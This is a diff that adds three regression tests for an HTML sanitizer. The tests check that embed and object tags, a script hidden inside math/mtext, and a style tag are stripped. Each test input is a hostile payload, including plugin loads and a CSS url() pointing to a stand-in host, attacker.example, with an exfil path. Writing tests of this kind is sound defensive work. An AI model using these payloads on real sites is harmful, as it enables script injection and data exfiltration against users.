@@ -246,4 +246,39 @@ describe('red-team runtime regressions', () => {
     expect(container.querySelector('a')?.getAttribute('href')).toBeNull();
     expect(container.querySelector('iframe')).toBeNull();
   });
+
+  test('strips <embed> and <object> plugin-execution surfaces', () => {
+    const sanitized = resolveHtmlString(
+      '<p>ok</p><embed src="https://attacker.example/evil.swf" type="application/x-shockwave-flash"><object data="https://attacker.example/evil.pdf"></object>',
+      { policy: 'sanitized-html' },
+    );
+    const container = document.createElement('div');
+    container.innerHTML = sanitized;
+    expect(container.querySelector('embed')).toBeNull();
+    expect(container.querySelector('object')).toBeNull();
+    expect(container.querySelector('p')?.textContent).toBe('ok');
+  });
+
+  test('strips <math> namespace foreign-content', () => {
+    const sanitized = resolveHtmlString(
+      '<p>ok</p><math><mtext><script>alert(1)</script></mtext></math>',
+      { policy: 'sanitized-html' },
+    );
+    const container = document.createElement('div');
+    container.innerHTML = sanitized;
+    expect(container.querySelector('math')).toBeNull();
+    expect(container.querySelector('script')).toBeNull();
+    expect(container.querySelector('p')?.textContent).toBe('ok');
+  });
+
+  test('strips <style> CSS-injection surface', () => {
+    const sanitized = resolveHtmlString(
+      '<p>ok</p><style>body { background: url("https://attacker.example/exfil"); }</style>',
+      { policy: 'sanitized-html' },
+    );
+    const container = document.createElement('div');
+    container.innerHTML = sanitized;
+    expect(container.querySelector('style')).toBeNull();
+    expect(container.querySelector('p')?.textContent).toBe('ok');
+  });
 });
